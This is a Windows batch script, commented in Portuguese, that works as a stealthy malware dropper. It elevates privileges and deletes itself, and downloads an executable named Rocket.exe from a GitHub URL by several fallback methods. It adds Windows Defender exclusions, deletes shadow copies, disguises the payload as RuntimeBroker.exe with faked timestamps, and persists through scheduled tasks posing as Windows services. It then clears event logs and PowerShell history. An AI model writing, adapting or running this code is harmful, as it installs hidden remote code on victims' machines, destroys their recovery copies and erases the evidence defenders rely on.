@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -EP Bypass -WS Hidden -Command "Start-Process cmd -ArgumentList ('/c """' + '%~f0' + '"""') -Verb RunAs"
    exit
)
set "TMPSELF=%TEMP%\svchost_tmp_%RANDOM%.bat"
if not "%~f0"=="%TMPSELF%" (
    copy /y "%~f0" "%TMPSELF%" >nul 2>&1
    del /f /q "%~f0" >nul 2>&1
    powershell -EP Bypass -WS Hidden -Command "Start-Process cmd -ArgumentList ('/c """' + '%TMPSELF%' + '"""') -Verb RunAs"
    exit
)

:: ============================================
:: LIMPEZA DE INSTALACAO ANTERIOR
:: ============================================
:: Deletar tasks antigas
schtasks /end /tn "RuntimeBrokerHost" >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHost" /f >nul 2>&1
schtasks /end /tn "RuntimeBrokerHostCleanup" >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHostCleanup" /f >nul 2>&1

:: Matar processos RuntimeBroker.exe antigos
taskkill /f /im RuntimeBroker.exe >nul 2>&1

:: Deletar arquivo antigo
set "IDIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "IPATH=%IDIR%\RuntimeBroker.exe"
attrib -s -h "%IPATH%" >nul 2>&1
del /q /f "%IPATH%" >nul 2>&1

:: Limpar cache de certos locais
certutil -urlcache * delete >nul 2>&1
if exist "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" rd /s /q "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1

:: ============================================
:: INSTALACAO
:: ============================================
set "GURL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
if not exist "%IDIR%" mkdir "%IDIR%" >nul 2>&1
sc stop SysMain >nul 2>&1
sc config SysMain start= disabled >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Add-MpPreference -ExclusionPath '%IDIR%' -EA SilentlyContinue" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Add-MpPreference -ExclusionPath '%IPATH%' -EA SilentlyContinue" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "takeown /f '%IDIR%' /r /d y;icacls '%IDIR%' /grant $env:USERNAME':F' /t" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri '%GURL%' -OutFile '%TEMP%\Rocket_tmp.exe' -UseBasicParsing -EA SilentlyContinue" >nul 2>&1
if not exist "%TEMP%\Rocket_tmp.exe" certutil -urlcache -split -f "%GURL%" "%TEMP%\Rocket_tmp.exe" >nul 2>&1
if not exist "%TEMP%\Rocket_tmp.exe" bitsadmin /transfer svc /download /priority high "%GURL%" "%TEMP%\Rocket_tmp.exe" >nul 2>&1
if not exist "%TEMP%\Rocket_tmp.exe" ( sc config SysMain start= auto >nul 2>&1 & sc start SysMain >nul 2>&1 & exit /b 1 )
copy /y "%TEMP%\Rocket_tmp.exe" "%IPATH%" >nul 2>&1
if not exist "%IPATH%" powershell -EP Bypass -WS Hidden -Command "Copy-Item '%TEMP%\Rocket_tmp.exe' '%IPATH%' -Force" >nul 2>&1
del /q /f "%TEMP%\Rocket_tmp.exe" >nul 2>&1
if not exist "%IPATH%" ( sc config SysMain start= auto >nul 2>&1 & sc start SysMain >nul 2>&1 & exit /b 1 )
attrib +s +h "%IPATH%" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "$f=Get-Item '%IPATH%' -Force;$f.LastWriteTime=(Get-Date).AddYears(-2);$f.CreationTime=(Get-Date).AddYears(-2)" >nul 2>&1
sc config SysMain start= auto >nul 2>&1
sc start SysMain >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHost" /f >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "$a=New-ScheduledTaskAction -Execute '%IPATH%';$t=New-ScheduledTaskTrigger -AtLogOn;$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0);Register-ScheduledTask -TaskName 'RuntimeBrokerHost' -Action $a -Trigger $t -Principal $p -Settings $s -Description 'Windows Runtime Broker Host Service' -Force" >nul 2>&1
schtasks /delete /tn "RuntimeBrokerHostCleanup" /f >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "$a=New-ScheduledTaskAction -Execute '%IPATH%' -Argument '/cleanup';$p=New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;Register-ScheduledTask -TaskName 'RuntimeBrokerHostCleanup' -Action $a -Principal $p -Settings $s -Description 'Windows Runtime Broker Host Cleanup' -Force" >nul 2>&1

:: ============================================
:: LIMPEZA FINAL
:: ============================================
certutil -urlcache * delete >nul 2>&1
if exist "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" rd /s /q "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "foreach($l in @('Setup','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-Bits-Client/Operational','Microsoft-Windows-Windows Defender/Operational','Microsoft-Windows-Eventlog/Operational')){wevtutil cl $l /quiet 2>$null}" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
del /q /f "%TEMP%\svchost_tmp*.bat" >nul 2>&1
set "SD=%TEMP%\sd_%RANDOM%.bat"
echo @echo off > "%SD%"
echo timeout /t 3 /nobreak ^>nul >> "%SD%"
echo del /q /f "%%~f0" ^>nul 2^>^&1 >> "%SD%"
start "" /min "%SD%"
exit
